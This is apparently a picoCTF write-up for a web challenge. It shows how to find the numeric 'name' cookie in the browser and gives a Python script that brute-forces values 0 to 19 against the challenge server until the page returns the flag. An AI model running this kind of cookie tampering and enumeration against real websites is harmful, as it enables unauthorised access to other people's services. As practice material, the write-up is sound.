The site gives you a search bar to search for different kinds of cookies.

If you open up the developer console => application tab => cookies, you can see the name and value columns.

As you search for different cookies in the search bar (i.e input "snickerdoodle" into the search bar and hit "search"), you will see that each type of cookie corresponds to a different value. You will see that "snickerdoodle" corresponds to the cookie value of 1 for example.

From here, you can manually change the values of the cookies, incrementing by 1 until you get the flag, or you can write a script to send requests. Here is a python script that does this:

```python
import requests

for i in range(20):
    cookies = {
        'name': str(i)
    }

    response = requests.get("http://mercury.picoctf.net:29649/check", cookies=cookies)
    data = response.text.split("<p style=\"text-align:center; font-size:30px;\"><b>")[1].split("</b>")[0]

    # print out the number of the cookie value that produces the flag
    # then go into the browser and change the cookie value to this number to get the answer
    if (data == 'Flag'):
        print(i)
```
